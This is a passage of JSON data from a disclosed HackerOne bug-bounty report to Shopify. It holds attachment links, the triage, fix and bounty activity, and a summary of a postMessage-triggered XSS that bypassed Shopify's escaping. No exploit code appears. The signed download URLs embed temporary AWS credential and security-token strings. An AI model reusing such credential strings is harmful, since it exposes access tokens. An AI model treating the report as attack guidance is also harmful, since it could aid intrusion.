JztYb6rdSeSRyzKgf4LxEu42JMoyPyy0VqqdaIdaW%2F5Oe%2FZcBqKJkPjfrnsLv1E3Cttn6QZ2fsMawdDGLyKyEEvAx6LbD4TYD1QOy0YJIw6j32Nt3V4psvzyU384FsJYLymiqMGAqTzIuUS4QNvTcHn%2BFoOZvS%2F06fP5YWj%2BxpW%2BELDyBb5CFIWqKXYmkW%2BPv4IxFiMVfFF4KM80ZKVGfyJ7nRaRwvjM5YUJYHOlvXjFuPBSC3IYIgEZYlopEqTolZ1OQ2zbi1yDB%2FWl1rx7i7cbCVK6zJwPdLcPRBOa7jlMN0jlHdNPzjyKxdEaNBy7Cyflyw%2FZCl7X1dB7yuSBF8YK2st4h%2FZchseLh%2BjukipjtpVl5nDjO8BSu5evt1V1lFzADomlTKShrSgjmej1gvXmULpbdNuEwc3vMl328MfuwtHHSSvzZo5xxP0U1cq9fhM0Ztcea1ZRpQDZR4DB1jRqdjeMIXNuuwv3G7Uotj1VrvA87zW9Og6gQ9VN7fQSdOpurQFAV2WvRMIuSqv8FOusB%2B%2BEh7xquKUpKrZEfrLl0yLcAZyezk5OlnVLaoE%2BCU7%2F1YWDwq4fJ%2Fzqx58r%2Ffgzx%2FRuGFLAoCPIl7GI47ntqpCuRo5kjknXh3Vhm0Ds%2B9y0Uo9mgVKhl6XjEqADeRJOm5JpIvTZkPibWah%2FFXooiOsIWnpbe3xZbkrh62wdx0iVuonbBNy6Z0vYXXREkzeNyKh%2Fx0i0DwAehfYiLehqkIm1GqvDnaSiQ0dTRzOsrEnXwNhRtDRaBDDLvFXHGy3Xm8ucb70jki0U1otEIUfIG%2Fnfsrs7zhSOcLfi6%2B4aytuy%2FrSFLmVnwIpfIzQ%3D%3D\u0026X-Amz-Signature=7415d7769760c6ca36175ec5b03a6bb303ccd8ba9b14fab6d70e27356261c31a","file_size":37657,"type":"image/png"},{"id":187326,"file_name":"Screen_Shot_2017-05-23_at_2.24.34_AM.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/187/326/a896e551f4f0d07897a3e55daaa84baeaace9076/Screen_Shot_2017-05-23_at_2.24.34_AM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2017-05-23_at_2.24.34_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2017-05-23_at_2.24.34_AM.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ2UMPB2FX%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T050508Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEq9neBunEjsdY7f8cNZfYtjkYnfx7sYXIBk82UycrktAiEA5w10R4CJv%2FQIiYTXv1ZP8q%2BbScvvzy7qwcG%2BmPmKCXMqtAMIUxABGgwwMTM2MTkyNzQ4NDkiDKX6CTSGAGf6Bt5yHyqRA9qW1WRQYe7JztYb6rdSeSRyzKgf4LxEu42JMoyPyy0VqqdaIdaW%2F5Oe%2FZcBqKJkPjfrnsLv1E3Cttn6QZ2fsMawdDGLyKyEEvAx6LbD4TYD1QOy0YJIw6j32Nt3V4psvzyU384FsJYLymiqMGAqTzIuUS4QNvTcHn%2BFoOZvS%2F06fP5YWj%2BxpW%2BELDyBb5CFIWqKXYmkW%2BPv4IxFiMVfFF4KM80ZKVGfyJ7nRaRwvjM5YUJYHOlvXjFuPBSC3IYIgEZYlopEqTolZ1OQ2zbi1yDB%2FWl1rx7i7cbCVK6zJwPdLcPRBOa7jlMN0jlHdNPzjyKxdEaNBy7Cyflyw%2FZCl7X1dB7yuSBF8YK2st4h%2FZchseLh%2BjukipjtpVl5nDjO8BSu5evt1V1lFzADomlTKShrSgjmej1gvXmULpbdNuEwc3vMl328MfuwtHHSSvzZo5xxP0U1cq9fhM0Ztcea1ZRpQDZR4DB1jRqdjeMIXNuuwv3G7Uotj1VrvA87zW9Og6gQ9VN7fQSdOpurQFAV2WvRMIuSqv8FOusB%2B%2BEh7xquKUpKrZEfrLl0yLcAZyezk5OlnVLaoE%2BCU7%2F1YWDwq4fJ%2Fzqx58r%2Ffgzx%2FRuGFLAoCPIl7GI47ntqpCuRo5kjknXh3Vhm0Ds%2B9y0Uo9mgVKhl6XjEqADeRJOm5JpIvTZkPibWah%2FFXooiOsIWnpbe3xZbkrh62wdx0iVuonbBNy6Z0vYXXREkzeNyKh%2Fx0i0DwAehfYiLehqkIm1GqvDnaSiQ0dTRzOsrEnXwNhRtDRaBDDLvFXHGy3Xm8ucb70jki0U1otEIUfIG%2Fnfsrs7zhSOcLfi6%2B4aytuy%2FrSFLmVnwIpfIzQ%3D%3D\u0026X-Amz-Signature=c428e3e29ece366aef3be2e55a21a950bf62e04efb15e9c8909299e951175af2","file_size":55557,"type":"image/png"}],"allow_singular_disclosure_at":null,"vote_count":104,"voters":["flamezzz","jin","manoelt","arneswinnen","tomdev","sp1d3rs","cdl","kapytein","jobert","hunter","and 94 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1700650,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. Our engineering team is investigating the issue.","markdown_message":"\u003cp\u003eThank you for your report. Our engineering team is investigating the issue.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-25T14:11:06.715Z","updated_at":"2017-05-25T14:11:06.715Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1704523,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey!\n\nWe recently deployed a fix for this issue. We've verified that your PoC no longer works. Would you mind verifying it from your end?","markdown_message":"\u003cp\u003eHey!\u003c/p\u003e\n\n\u003cp\u003eWe recently deployed a fix for this issue. We\u0026#39;ve verified that your PoC no longer works. Would you mind verifying it from your end?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-26T22:54:06.160Z","updated_at":"2017-05-26T22:54:06.160Z","actor":{"username":"jack_mccracken","cleared":false,"url":"/jack_mccracken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/164/342/6543dc397b4dbb2c24dc81f92a42de654a3e6a99_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1705331,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@jack_mccracken The deployed fix looks good to me! ","markdown_message":"\u003cp\u003e\u003ca href=\"/jack_mccracken\"\u003e@jack_mccracken\u003c/a\u003e The deployed fix looks good to me! \u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-27T17:02:05.719Z","updated_at":"2017-05-27T17:02:05.719Z","actor":{"username":"bored-engineer","cleared":false,"url":"/bored-engineer","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/328/c56b0e4e98b2bb24781c0cbec9ab8cd23be36b5f_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1706509,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2017-05-28T21:13:05.128Z","updated_at":"2017-05-28T21:13:05.128Z","actor":{"username":"jack_mccracken","cleared":false,"url":"/jack_mccracken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/164/342/6543dc397b4dbb2c24dc81f92a42de654a3e6a99_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"bored-engineer","url":"/bored-engineer"},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1707792,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hi @bored-engineer, thanks again for this report. We're awarding a bounty slightly higher than similar reports based on a couple of factors:\n1) the issue can be used by an unauthenticated attacker, and affects all stores\n2) the quality of the report\n3) there is a good chance the issue might not have been found internally, even by qualified reviewers, because of the tricky escaping logic we had in place","markdown_message":"\u003cp\u003eHi \u003ca href=\"/bored-engineer\"\u003e@bored-engineer\u003c/a\u003e, thanks again for this report. We\u0026#39;re awarding a bounty slightly higher than similar reports based on a couple of factors:\u003cbr\u003e\n1) the issue can be used by an unauthenticated attacker, and affects all stores\u003cbr\u003e\n2) the quality of the report\u003cbr\u003e\n3) there is a good chance the issue might not have been found internally, even by qualified reviewers, because of the tricky escaping logic we had in place\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-29T17:25:55.306Z","updated_at":"2017-05-29T17:25:55.306Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Shopify"}},"bounty_amount":"3000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify","collaborator":{"username":"bored-engineer","url":"/bored-engineer"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1707793,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"We can disclose the report if you'd like","markdown_message":"\u003cp\u003eWe can disclose the report if you\u0026#39;d like\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-29T17:26:17.729Z","updated_at":"2017-05-29T17:26:17.729Z","first_to_agree":true,"actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1710187,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Sure, it was a fun one to work on. Thanks!","markdown_message":"\u003cp\u003eSure, it was a fun one to work on. Thanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-30T17:10:05.239Z","updated_at":"2017-05-30T17:10:05.239Z","actor":{"username":"bored-engineer","cleared":false,"url":"/bored-engineer","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/328/c56b0e4e98b2bb24781c0cbec9ab8cd23be36b5f_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1710188,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-05-30T17:10:05.291Z","updated_at":"2017-05-30T17:10:05.291Z","actor":{"username":"bored-engineer","cleared":false,"url":"/bored-engineer","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/328/c56b0e4e98b2bb24781c0cbec9ab8cd23be36b5f_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":4248,"category":"team","content":"This issue is a XSS affecting all Shopify stores that can be triggered via `windows.postMessage` from any remote origin. The report demonstrated a clever bypass of the escaping code we had in place to prevent code injection.","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eThis issue is a XSS affecting all Shopify stores that can be triggered via \u003ccode\u003ewindows.postMessage\u003c/code\u003e from any remote origin. The report demonstrated a clever bypass of the escaping code we had in place to prevent code injection.\u003c/p\u003e\n"},{"category":"researcher","can_view?":true,"can_create?":false}]}